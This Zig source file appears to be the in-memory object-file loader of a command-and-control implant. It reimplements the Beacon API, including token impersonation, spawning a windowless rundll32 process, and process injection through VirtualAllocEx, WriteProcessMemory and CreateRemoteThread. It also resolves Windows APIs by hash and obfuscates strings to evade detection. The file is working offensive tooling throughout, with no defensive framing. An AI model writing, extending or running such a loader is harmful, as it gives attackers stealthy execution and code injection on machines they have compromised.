const std = @import("std");
const win = @import("win32.zig");
const obf = @import("obf.zig");
const api = @import("api.zig");

const nx_page_allocator = @import("alloc.zig").nx_page_allocator;

// ---------------------------------------------------------------------------
// COFF/AMD64 definitions
// ---------------------------------------------------------------------------
const NX_COFF_MACHINE_AMD64: u16 = 0x8664;
const NX_COFF_REL_AMD64_ADDR64: u16 = 0x0001;
const NX_COFF_REL_AMD64_ADDR32NB: u16 = 0x0003;
const NX_COFF_REL_AMD64_REL32: u16 = 0x0004;
const NX_COFF_REL_AMD64_REL32_5: u16 = 0x0009;
const NX_COFF_SCN_MEM_EXECUTE: u32 = 0x20000000;
const NX_COFF_SYM_CLASS_EXTERNAL: u8 = 2;
const NX_COFF_SYM_CLASS_EXTERNAL_DEF: u8 = 5;

const NX_MAX_BOF_OUTPUT: usize = 32 * 1024 * 1024;
const NX_DEFAULT_TIMEOUT_MS: u32 = 60_000;

pub const NxStatus = enum { ok, failed, timed_out, busy };
pub const NxResult = struct {
    status: NxStatus,
    output: []u8,
};

// ---------------------------------------------------------------------------
// Beacon API for BOFs
// ---------------------------------------------------------------------------
pub const NxBeaconData = extern struct {
    original: ?[*]u8,
    buffer: ?[*]u8,
    length: c_int,
    size: c_int,
};

pub const NxBeaconFormat = extern struct {
    original: ?[*]u8,
    buffer: ?[*]u8,
    length: c_int,
    size: c_int,
};

extern fn BeaconPrintf(beacon_type: c_int, fmt: [*:0]u8, ...) callconv(.c) void;
extern fn BeaconFormatPrintf(format: *NxBeaconFormat, fmt: [*:0]u8, ...) callconv(.c) void;

var nx_output_buffer: std.ArrayList(u8) = .empty;
var nx_bof_active = std.atomic.Value(bool).init(false);
var nx_c_specific_handler: ?*const anyopaque = null;

pub export fn nx_beacon_append(data: [*]const u8, len: c_int) callconv(.c) void {
    if (len <= 0) return;
    const amount: usize = @intCast(len);
    if (nx_output_buffer.items.len + amount > NX_MAX_BOF_OUTPUT) return;
    nx_output_buffer.appendSlice(nx_page_allocator, data[0..amount]) catch {};
}

fn nx_clear_output() void {
    nx_output_buffer.clearAndFree(nx_page_allocator);
}

fn nx_take_output(allocator: std.mem.Allocator) ![]u8 {
    const result = try allocator.dupe(u8, nx_output_buffer.items);
    nx_output_buffer.clearAndFree(nx_page_allocator);
    return result;
}

pub export fn BeaconDataParse(parser: ?*NxBeaconData, buffer: ?[*]u8, size: c_int) callconv(.c) void {
    const value = parser orelse return;
    value.original = buffer;
    if (buffer == null or size < 4) {
        value.buffer = buffer;
        value.length = 0;
        value.size = 0;
        return;
    }
    value.buffer = buffer.? + 4;
    value.length = size - 4;
    value.size = size - 4;
}

pub export fn BeaconDataInt(parser: ?*NxBeaconData) callconv(.c) c_int {
    const value = parser orelse return 0;
    if (value.length < 4) return 0;
    const buffer = value.buffer orelse return 0;
    const result = std.mem.readInt(i32, buffer[0..4], .little);
    value.buffer = buffer + 4;
    value.length -= 4;
    return result;
}

pub export fn BeaconDataShort(parser: ?*NxBeaconData) callconv(.c) c_short {
    const value = parser orelse return 0;
    if (value.length < 2) return 0;
    const buffer = value.buffer orelse return 0;
    const result = std.mem.readInt(i16, buffer[0..2], .little);
    value.buffer = buffer + 2;
    value.length -= 2;
    return result;
}

pub export fn BeaconDataLength(parser: ?*NxBeaconData) callconv(.c) c_int {
    const value = parser orelse return 0;
    return value.length;
}

pub export fn BeaconDataExtract(parser: ?*NxBeaconData, size: ?*c_int) callconv(.c) ?[*]u8 {
    const value = parser orelse return null;
    if (value.length < 4) {
        if (size) |out| out.* = 0;
        return null;
    }
    const buffer = value.buffer orelse {
        if (size) |out| out.* = 0;
        return null;
    };
    const length = std.mem.readInt(u32, buffer[0..4], .little);
    if (length > @as(u32, @intCast(value.length - 4))) {
        if (size) |out| out.* = 0;
        return null;
    }
    value.buffer = buffer + 4;
    value.length -= 4;
    const result = value.buffer orelse return null;
    value.buffer = result + length;
    value.length -= @intCast(length);
    if (size) |out| out.* = @intCast(length);
    return result;
}

pub export fn BeaconFormatAlloc(format: ?*NxBeaconFormat, maxsz: c_int) callconv(.c) void {
    const value = format orelse return;
    if (maxsz <= 0) return;
    const memory = nx_page_allocator.alloc(u8, @intCast(maxsz)) catch return;
    value.original = memory.ptr;
    value.buffer = memory.ptr;
    value.length = 0;
    value.size = maxsz;
}

pub export fn BeaconFormatReset(format: ?*NxBeaconFormat) callconv(.c) void {
    const value = format orelse return;
    if (value.original) |original| {
        if (value.size > 0) @memset(original[0..@intCast(value.size)], 0);
        value.buffer = original;
        value.length = 0;
    }
}

pub export fn BeaconFormatFree(format: ?*NxBeaconFormat) callconv(.c) void {
    const value = format orelse return;
    if (value.original) |original| {
        if (value.size > 0) nx_page_allocator.free(original[0..@intCast(value.size)]);
    }
    value.original = null;
    value.buffer = null;
    value.length = 0;
    value.size = 0;
}

pub export fn BeaconFormatAppend(format: ?*NxBeaconFormat, text: ?[*]u8, len: c_int) callconv(.c) void {
    const value = format orelse return;
    if (text == null or len <= 0) return;
    const buffer = value.buffer orelse return;
    if (value.length < 0 or value.length > value.size) return;
    const amount: usize = @intCast(len);
    if (amount > @as(usize, @intCast(value.size - value.length))) return;
    @memcpy(buffer[0..amount], text.?[0..amount]);
    value.buffer = buffer + amount;
    value.length += len;
}

pub export fn BeaconFormatToString(format: ?*NxBeaconFormat, size: ?*c_int) callconv(.c) ?[*]u8 {
    const value = format orelse return null;
    const out_size = size orelse return null;
    out_size.* = value.length;
    return value.original;
}

pub export fn BeaconFormatInt(format: ?*NxBeaconFormat, number: c_int) callconv(.c) void {
    const value = format orelse return;
    const buffer = value.buffer orelse return;
    if (value.length + 4 > value.size) return;
    std.mem.writeInt(u32, buffer[0..4], @bitCast(number), .big);
    value.buffer = buffer + 4;
    value.length += 4;
}

pub export fn BeaconOutput(beacon_type: c_int, data: ?[*]u8, len: c_int) callconv(.c) void {
    _ = beacon_type;
    if (data == null or len <= 0) return;
    nx_beacon_append(data.?, len);
}

pub export fn BeaconUseToken(token: ?*anyopaque) callconv(.c) win.BOOL {
    if (token) |value| {
        _ = win.SetThreadToken(null, @ptrCast(value));
    }
    return win.BOOL.TRUE;
}

pub export fn BeaconRevertToken() callconv(.c) void {
    _ = win.RevertToSelf();
}

pub export fn BeaconIsAdmin() callconv(.c) win.BOOL {
    var token: win.HANDLE = undefined;
    if (!win.OpenProcessToken(win.GetCurrentProcess(), win.TOKEN_QUERY, &token).toBool())
        return win.BOOL.FALSE;
    defer _ = win.CloseHandle(token);

    var elevation: win.TOKEN_ELEVATION = .{ .TokenIsElevated = 0 };
    var length: win.DWORD = @sizeOf(win.TOKEN_ELEVATION);
    if (!win.GetTokenInformation(token, .TokenElevation, &elevation, length, &length).toBool())
        return win.BOOL.FALSE;
    return if (elevation.TokenIsElevated != 0) win.BOOL.TRUE else win.BOOL.FALSE;
}

pub export fn BeaconGetSpawnTo(x86: win.BOOL, buffer: ?[*]u8, length: c_int) callconv(.c) void {
    const output = buffer orelse return;
    if (length <= 0) return;
    const path: [:0]const u8 = if (x86.toBool())
        "C:\\Windows\\SysWOW64\\rundll32.exe"
    else
        "C:\\Windows\\System32\\rundll32.exe";
    const amount = @min(path.len, @as(usize, @intCast(length)));
    @memcpy(output[0..amount], path[0..amount]);
}

pub export fn BeaconSpawnTemporaryProcess(
    x86: win.BOOL,
    ignore_token: win.BOOL,
    startup_info: ?*win.STARTUPINFOA,
    process_info: ?*win.PROCESS_INFORMATION,
) callconv(.c) win.BOOL {
    _ = ignore_token;
    const startup = startup_info orelse return win.BOOL.FALSE;
    const process = process_info orelse return win.BOOL.FALSE;
    const path: [:0]const u8 = if (x86.toBool())
        "C:\\Windows\\SysWOW64\\rundll32.exe"
    else
        "C:\\Windows\\System32\\rundll32.exe";
    return win.CreateProcessA(
        null,
        @constCast(path.ptr),
        null,
        null,
        win.BOOL.TRUE,
        win.CREATE_NO_WINDOW,
        null,
        null,
        startup,
        process,
    );
}

pub export fn BeaconInjectProcess(
    process_handle: ?*anyopaque,
    pid: c_int,
    payload: ?[*]u8,
    payload_len: c_int,
    payload_offset: c_int,
    argument: ?[*]u8,
    argument_len: c_int,
) callconv(.c) void {
    _ = pid;
    const handle: win.HANDLE = @ptrCast(process_handle orelse return);
    const payload_ptr = payload orelse return;
    if (payload_len <= 0) return;

    const base = win.VirtualAllocEx(
        handle,
        null,
        @intCast(payload_len),
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_READWRITE,
    ) orelse return;
    defer _ = win.VirtualFree(base, 0, win.MEM_RELEASE);

    if (!win.WriteProcessMemory(handle, base, @ptrCast(payload_ptr), @intCast(payload_len), null).toBool())
        return;

    var old_protect: win.DWORD = 0;
    if (!win.VirtualProtectEx(handle, base, @intCast(payload_len), win.PAGE_EXECUTE_READ, &old_protect).toBool())
        return;

    var remote_arg: ?*anyopaque = null;
    if (argument) |args| {
        if (argument_len > 0) {
            const arg_base = win.VirtualAllocEx(
                handle,
                null,
                @intCast(argument_len),
                win.MEM_COMMIT | win.MEM_RESERVE,
                win.PAGE_READWRITE,
            ) orelse return;
            if (!win.WriteProcessMemory(handle, arg_base, @ptrCast(args), @intCast(argument_len), null).toBool())
                return;
            remote_arg = arg_base;
        }
    }

    const start = @as([*]u8, @ptrCast(base)) + @as(usize, @intCast(payload_offset));
    const thread = win.CreateRemoteThread(
        handle,
        null,
        0,
        @ptrCast(start),
        remote_arg,
        0,
        null,
    );
    if (thread) |handle_thread| _ = win.CloseHandle(handle_thread);
}

pub export fn BeaconInjectTemporaryProcess(
    process_info: ?*win.PROCESS_INFORMATION,
    payload: ?[*]u8,
    payload_len: c_int,
    payload_offset: c_int,
    argument: ?[*]u8,
    argument_len: c_int,
) callconv(.c) void {
    const info = process_info orelse return;
    BeaconInjectProcess(
        @ptrCast(info.hProcess),
        0,
        payload,
        payload_len,
        payload_offset,
        argument,
        argument_len,
    );
}

pub export fn BeaconCleanupProcess(process_info: ?*win.PROCESS_INFORMATION) callconv(.c) void {
    const info = process_info orelse return;
    _ = win.CloseHandle(info.hThread);
    _ = win.CloseHandle(info.hProcess);
}

pub export fn coffToWideChar(source: ?[*:0]const u8, destination: ?[*]u16, max: c_int) callconv(.c) win.BOOL {
    const src = source orelse return win.BOOL.FALSE;
    const dst = destination orelse return win.BOOL.FALSE;
    if (max < 2) return win.BOOL.FALSE;
    const result = win.MultiByteToWideChar(
        win.CP_ACP,
        0,
        src,
        -1,
        dst,
        @divTrunc(max, 2),
    );
    return if (result > 0) win.BOOL.TRUE else win.BOOL.FALSE;
}

// ---------------------------------------------------------------------------
// Internal BOF imports
// ---------------------------------------------------------------------------
const NxInternalFunction = struct {
    hash: u32,
    address: ?*const anyopaque,
};

const nx_internal_functions = [_]NxInternalFunction{
    .{ .hash = 0xA7BB136C, .address = @ptrCast(&BeaconDataParse) },
    .{ .hash = 0xA0B63F5C, .address = @ptrCast(&BeaconDataInt) },
    .{ .hash = 0xA7F526C1, .address = @ptrCast(&BeaconDataShort) },
    .{ .hash = 0x960EDE13, .address = @ptrCast(&BeaconDataLength) },
    .{ .hash = 0x69D7452C, .address = @ptrCast(&BeaconDataExtract) },
    .{ .hash = 0x98A936EB, .address = @ptrCast(&BeaconFormatAlloc) },
    .{ .hash = 0x99D91D63, .address = @ptrCast(&BeaconFormatReset) },
    .{ .hash = 0xA78BD822, .address = @ptrCast(&BeaconFormatFree) },
    .{ .hash = 0xAE1A7EF8, .address = @ptrCast(&BeaconFormatAppend) },
    .{ .hash = 0xD13861D3, .address = @ptrCast(&BeaconFormatPrintf) },
    .{ .hash = 0xE2AFE77A, .address = @ptrCast(&BeaconFormatToString) },
    .{ .hash = 0xFD51DC8B, .address = @ptrCast(&BeaconFormatInt) },
    .{ .hash = 0x411236AA, .address = @ptrCast(&BeaconPrintf) },
    .{ .hash = 0x3EF96868, .address = @ptrCast(&BeaconOutput) },
    .{ .hash = 0xAFD33F65, .address = @ptrCast(&BeaconUseToken) },
    .{ .hash = 0x3E72A1B0, .address = @ptrCast(&BeaconRevertToken) },
    .{ .hash = 0x4A402E5C, .address = @ptrCast(&BeaconIsAdmin) },
    .{ .hash = 0xE6C9E8C3, .address = @ptrCast(&BeaconGetSpawnTo) },
    .{ .hash = 0x4A6845A2, .address = @ptrCast(&BeaconSpawnTemporaryProcess) },
    .{ .hash = 0x53935753, .address = @ptrCast(&BeaconInjectProcess) },
    .{ .hash = 0xC894C016, .address = @ptrCast(&BeaconInjectTemporaryProcess) },
    .{ .hash = 0xC85EACDE, .address = @ptrCast(&BeaconCleanupProcess) },
    .{ .hash = 0x333F75D9, .address = @ptrCast(&coffToWideChar) },
    .{ .hash = 0x2FBEA656, .address = @ptrCast(&coffToWideChar) },
    .{ .hash = 0x6E5A2965, .address = @ptrCast(&win.LoadLibraryA) },
    .{ .hash = 0xB6C745C9, .address = @ptrCast(&win.GetProcAddress) },
    .{ .hash = 0x8CF19062, .address = @ptrCast(&win.GetModuleHandleA) },
    .{ .hash = 0xEB8EA166, .address = @ptrCast(&win.FreeLibrary) },
};

const nx_common_modules = [_]u32{
    0xFAB06795, // kernel32
    0x6ACBC7D3, // user32
    0x7B933969, // advapi32
    0xD432B36D, // ntdll
    0x6F6BE52F, // ws2_32
    0xD44069D4, // ole32
    0xA759FDBE, // oleaut32
    0x10A4AA2C, // shell32
    0x8A3A67D0, // iphlpapi
    0xC33AF455, // netapi32
    0xD3AB53C8, // gdi32
    0xC44512B7, // userenv
    0x42D1036E, // dnsapi
    0x59C0B206, // crypt32
};

fn nx_coff_init() void {
    nx_c_specific_handler = @ptrCast(api.nx_api(0xFAB06795, 0x508385F2));
}

fn nx_find_internal(name: []const u8) ?*const anyopaque {
    const hash = api.nx_hash(name);
    for (nx_internal_functions) |function| {
        if (function.hash == hash) return function.address;
    }
    if (hash == 0x508385F2) return nx_c_specific_handler;
    return null;
}

fn nx_load_proc(library: []const u8, function: []const u8) ?*const anyopaque {
    if (library.len == 0 or function.len == 0) return null;
    var library_buffer: [260]u8 = undefined;
    if (library.len >= library_buffer.len) return null;
    @memcpy(library_buffer[0..library.len], library);
    library_buffer[library.len] = 0;

    var function_buffer: [260]u8 = undefined;
    if (function.len >= function_buffer.len) return null;
    @memcpy(function_buffer[0..function.len], function);
    function_buffer[function.len] = 0;

    const handle = win.LoadLibraryA(@ptrCast(&library_buffer)) orelse return null;
    return win.GetProcAddress(handle, @ptrCast(&function_buffer));
}

fn nx_trim_at(function: []const u8) []const u8 {
    if (std.mem.indexOfScalar(u8, function, '@')) |index| return function[0..index];
    return function;
}

fn nx_resolve_symbol(symbol: []const u8) ?*const anyopaque {
    var prefix_buf = obf.z("__imp_");
    const prefix = prefix_buf.slice();
    const local = if (std.mem.startsWith(u8, symbol, prefix)) symbol[prefix.len..] else symbol;
    if (nx_find_internal(local)) |address| return address;

    if (std.mem.indexOfScalar(u8, local, '$')) |dollar| {
        return nx_load_proc(local[0..dollar], nx_trim_at(local[dollar + 1 ..]));
    }

    if (std.mem.startsWith(u8, symbol, prefix)) {
        const hash = api.nx_hash(local);
        for (nx_common_modules) |module_hash| {
            if (api.nx_api(module_hash, hash)) |address| return @ptrCast(address);
        }
    }
    return null;
}

// ---------------------------------------------------------------------------
// Loader
// ---------------------------------------------------------------------------
const NxBofContext = struct {
    entry: *const fn ([*]u8, c_ulong) callconv(.c) void,
    args: [*]u8,
    len: c_ulong,
};

fn nx_bof_thread(parameter: ?*anyopaque) callconv(.winapi) win.DWORD {
    const context: *NxBofContext = @ptrCast(@alignCast(parameter.?));
    context.entry(context.args, context.len);
    nx_bof_active.store(false, .release);
    return 0;
}

fn nx_read_u16(data: []const u8, offset: usize) u16 {
    return std.mem.readInt(u16, data[offset..][0..2], .little);
}

fn nx_read_u32(data: []const u8, offset: usize) u32 {
    return std.mem.readInt(u32, data[offset..][0..4], .little);
}

fn nx_read_i16(data: []const u8, offset: usize) i16 {
    return std.mem.readInt(i16, data[offset..][0..2], .little);
}

fn nx_symbol_name(data: []const u8, string_table: usize, string_table_size: usize, symbol: usize) ?[]const u8 {
    const name = data[symbol..][0..8];
    if (nx_read_u32(name, 0) == 0) {
        const string_offset = nx_read_u32(name, 4);
        if (string_offset >= string_table_size) return null;
        const start = string_table + string_offset;
        if (start >= data.len) return null;
        const end = std.mem.indexOfScalarPos(u8, data, start, 0) orelse return null;
        return data[start..end];
    }
    var end: usize = 8;
    while (end > 0 and name[end - 1] == 0) : (end -= 1) {}
    return name[0..end];
}

fn nx_fail(allocator: std.mem.Allocator, message: []const u8) !NxResult {
    return .{ .status = .failed, .output = try allocator.dupe(u8, message) };
}

pub fn nx_execute(
    allocator: std.mem.Allocator,
    coff_data: []const u8,
    function_name: []const u8,
    arguments: []const u8,
    timeout_ms: u32,
) !NxResult {
    if (nx_bof_active.swap(true, .acq_rel)) {
        return .{
            .status = .busy,
            .output = try allocator.dupe(u8, "Loader busy"),
        };
    }

    var keep_memory = false;
    var section_bases: []?*anyopaque = &.{};
    var function_mapping: []?*const anyopaque = &.{};
    var args_copy: ?[]u8 = null;
    var context: ?*NxBofContext = null;
    var thread: ?win.HANDLE = null;

    defer if (!keep_memory) {
        if (thread) |handle| _ = win.CloseHandle(handle);
        if (context) |ctx| nx_page_allocator.destroy(ctx);
        if (args_copy) |args| nx_page_allocator.free(args);
        if (function_mapping.len > 0) nx_page_allocator.free(function_mapping);
        for (section_bases) |maybe_base| {
            if (maybe_base) |base| _ = win.VirtualFree(base, 0, win.MEM_RELEASE);
        }
        if (section_bases.len > 0) nx_page_allocator.free(section_bases);
        nx_bof_active.store(false, .release);
    };

    nx_clear_output();
    nx_coff_init();

    if (coff_data.len < 20) return nx_fail(allocator, "Loader error 1");
    if (nx_read_u16(coff_data, 0) != NX_COFF_MACHINE_AMD64)
        return nx_fail(allocator, "Loader error 2");

    const section_count: usize = nx_read_u16(coff_data, 2);
    const symbol_table: usize = nx_read_u32(coff_data, 8);
    const symbol_count: usize = nx_read_u32(coff_data, 12);
    if (symbol_table < 20 or symbol_table > coff_data.len)
        return nx_fail(allocator, "Loader error 3");
    if (section_count > (coff_data.len - 20) / 40)
        return nx_fail(allocator, "Loader error 4");
    if (symbol_table + symbol_count * 18 > coff_data.len)
        return nx_fail(allocator, "Loader error 5");
    const string_table = symbol_table + symbol_count * 18;
    if (string_table + 4 > coff_data.len)
        return nx_fail(allocator, "Loader error 6");
    const string_table_size: usize = nx_read_u32(coff_data, string_table);
    if (string_table + string_table_size > coff_data.len)
        return nx_fail(allocator, "Loader error 7");

    section_bases = try nx_page_allocator.alloc(?*anyopaque, @max(section_count, 1));
    @memset(section_bases, null);
    const section_sizes = try nx_page_allocator.alloc(usize, @max(section_count, 1));
    defer nx_page_allocator.free(section_sizes);
    const section_characteristics = try nx_page_allocator.alloc(u32, @max(section_count, 1));
    defer nx_page_allocator.free(section_characteristics);

    var total_relocations: usize = 0;
    var i: usize = 0;
    while (i < section_count) : (i += 1) {
        const offset = 20 + i * 40;
        const virtual_size: usize = nx_read_u32(coff_data, offset + 8);
        const raw_size: usize = nx_read_u32(coff_data, offset + 16);
        const raw_pointer: usize = nx_read_u32(coff_data, offset + 20);
        const relocation_pointer: usize = nx_read_u32(coff_data, offset + 24);
        const relocation_count: usize = nx_read_u16(coff_data, offset + 32);
        section_characteristics[i] = nx_read_u32(coff_data, offset + 36);

        var memory_size = @max(virtual_size, raw_size);
        if (memory_size == 0) memory_size = 64;
        if (raw_size > 0 and raw_pointer + raw_size > coff_data.len)
            return nx_fail(allocator, "Loader error 8");
        if (relocation_count > 0 and relocation_pointer + relocation_count * 10 > coff_data.len)
            return nx_fail(allocator, "Loader error 9");

        const base = win.VirtualAlloc(
            null,
            memory_size,
            win.MEM_COMMIT | win.MEM_RESERVE,
            win.PAGE_READWRITE,
        ) orelse return nx_fail(allocator, "Loader error 10");
        section_bases[i] = base;
        section_sizes[i] = memory_size;

        const memory: [*]u8 = @ptrCast(base);
        if (raw_size > 0 and raw_pointer != 0) {
            @memcpy(memory[0..raw_size], coff_data[raw_pointer .. raw_pointer + raw_size]);
        } else {
            @memset(memory[0..memory_size], 0);
        }
        total_relocations += relocation_count;
    }

    function_mapping = try nx_page_allocator.alloc(?*const anyopaque, @max(total_relocations, 1));
    @memset(function_mapping, null);
    var function_count: usize = 0;

    i = 0;
    while (i < section_count) : (i += 1) {
        const section_offset = 20 + i * 40;
        const relocation_pointer: usize = nx_read_u32(coff_data, section_offset + 24);
        const relocation_count: usize = nx_read_u16(coff_data, section_offset + 32);
        const section_base: [*]u8 = @ptrCast(section_bases[i] orelse continue);
        const section_size = section_sizes[i];

        var r: usize = 0;
        while (r < relocation_count) : (r += 1) {
            const relocation = relocation_pointer + r * 10;
            const virtual_address: usize = nx_read_u32(coff_data, relocation);
            const symbol_index: usize = nx_read_u32(coff_data, relocation + 4);
            const relocation_type = nx_read_u16(coff_data, relocation + 8);
            if (symbol_index >= symbol_count)
                return nx_fail(allocator, "Loader error 11");

            const symbol_offset = symbol_table + symbol_index * 18;
            const name = nx_symbol_name(coff_data, string_table, string_table_size, symbol_offset) orelse
                return nx_fail(allocator, "Loader error 12");
            const symbol_value: usize = nx_read_u32(coff_data, symbol_offset + 8);
            const symbol_section = nx_read_i16(coff_data, symbol_offset + 12);
            const storage_class = coff_data[symbol_offset + 16];

            var function_pointer: *const anyopaque = undefined;
            if (symbol_section > 0) {
                const resolved_section: usize = @intCast(symbol_section - 1);
                if (resolved_section >= section_count)
                    return nx_fail(allocator, "Loader error 13");
                const base: [*]u8 = @ptrCast(section_bases[resolved_section] orelse
                    return nx_fail(allocator, "Loader error 14"));
                function_pointer = @ptrCast(base + symbol_value);
            } else if ((storage_class == NX_COFF_SYM_CLASS_EXTERNAL or
                storage_class == NX_COFF_SYM_CLASS_EXTERNAL_DEF) and symbol_value == 0)
            {
                const resolved = nx_resolve_symbol(name) orelse
                    return nx_fail(allocator, "Loader error 15");
                if (function_count >= function_mapping.len)
                    return nx_fail(allocator, "Loader error 16");
                function_mapping[function_count] = resolved;
                function_pointer = @ptrCast(&function_mapping[function_count]);
                function_count += 1;
            } else {
                return nx_fail(allocator, "Loader error 17");
            }

            if (relocation_type == NX_COFF_REL_AMD64_ADDR64) {
                if (virtual_address + 8 > section_size)
                    return nx_fail(allocator, "Loader error 18");
                var value = std.mem.readInt(u64, section_base[virtual_address..][0..8], .little);
                value +%= @intFromPtr(function_pointer);
                std.mem.writeInt(u64, section_base[virtual_address..][0..8], value, .little);
            } else if (relocation_type == NX_COFF_REL_AMD64_ADDR32NB) {
                if (symbol_section <= 0 or virtual_address + 4 > section_size)
                    return nx_fail(allocator, "Loader error 19");
                const resolved_section: usize = @intCast(symbol_section - 1);
                const base: [*]u8 = @ptrCast(section_bases[resolved_section] orelse
                    return nx_fail(allocator, "Loader error 14"));
                var value: usize = std.mem.readInt(u32, section_base[virtual_address..][0..4], .little);
                value = @intFromPtr(base) + value + symbol_value -
                    (@intFromPtr(section_base) + virtual_address + 4);
                std.mem.writeInt(u32, section_base[virtual_address..][0..4], @truncate(value), .little);
            } else if (relocation_type >= NX_COFF_REL_AMD64_REL32 and relocation_type <= NX_COFF_REL_AMD64_REL32_5) {
                if (virtual_address + 4 > section_size)
                    return nx_fail(allocator, "Loader error 20");
                const extra: usize = relocation_type - NX_COFF_REL_AMD64_REL32;
                var value: usize = std.mem.readInt(u32, section_base[virtual_address..][0..4], .little);
                value += @intFromPtr(function_pointer) -
                    (@intFromPtr(section_base) + virtual_address + 4 + extra);
                std.mem.writeInt(u32, section_base[virtual_address..][0..4], @truncate(value), .little);
            }
        }
    }

    i = 0;
    while (i < section_count) : (i += 1) {
        if ((section_characteristics[i] & NX_COFF_SCN_MEM_EXECUTE) == 0) continue;
        var old_protect: win.DWORD = 0;
        if (!win.VirtualProtect(
            section_bases[i],
            section_sizes[i],
            win.PAGE_EXECUTE_READ,
            &old_protect,
        ).toBool()) return nx_fail(allocator, "Loader error 21");
    }

    var entry_address: ?*const anyopaque = null;
    var symbol_index: usize = 0;
    while (symbol_index < symbol_count) {
        const symbol_offset = symbol_table + symbol_index * 18;
        const name = nx_symbol_name(coff_data, string_table, string_table_size, symbol_offset) orelse
            return nx_fail(allocator, "Loader error 22");
        const symbol_section = nx_read_i16(coff_data, symbol_offset + 12);
        if (std.mem.eql(u8, name, function_name) and symbol_section > 0) {
            const resolved_section: usize = @intCast(symbol_section - 1);
            const base: [*]u8 = @ptrCast(section_bases[resolved_section] orelse
                return nx_fail(allocator, "Loader error 23"));
            entry_address = @ptrCast(base + nx_read_u32(coff_data, symbol_offset + 8));
            break;
        }
        symbol_index += 1 + coff_data[symbol_offset + 17];
    }

    const entry = entry_address orelse
        return nx_fail(allocator, "Loader error 24");

    args_copy = try nx_page_allocator.alloc(u8, @max(arguments.len, 4));
    @memset(args_copy.?, 0);
    if (arguments.len > 0) @memcpy(args_copy.?[0..arguments.len], arguments);

    context = try nx_page_allocator.create(NxBofContext);
    context.?.* = .{
        .entry = @ptrCast(entry),
        .args = args_copy.?.ptr,
        .len = @intCast(args_copy.?.len),
    };

    thread = win.CreateThread(null, 0, nx_bof_thread, context, 0, null) orelse
        return nx_fail(allocator, "Loader error 25");

    const wait_result = win.WaitForSingleObject(thread.?, timeout_ms);
    if (wait_result == win.WAIT_OBJECT_0) {
        const output = try nx_take_output(allocator);
        return .{ .status = .ok, .output = output };
    }
    if (wait_result == win.WAIT_TIMEOUT) {
        _ = win.CloseHandle(thread.?);
        thread = null;
        keep_memory = true;
        return .{
            .status = .timed_out,
            .output = try std.fmt.allocPrint(
                allocator,
                "Loader timeout after {d}s",
                .{timeout_ms / 1000},
            ),
        };
    }
    return nx_fail(allocator, "Loader wait failed");
}

pub fn nx_default_timeout_ms(params_timeout: i64) u32 {
    if (params_timeout <= 0) return NX_DEFAULT_TIMEOUT_MS;
    const value: u64 = @intCast(params_timeout);
    if (value > 600) return 600_000;
    return @intCast(value * 1000);
}
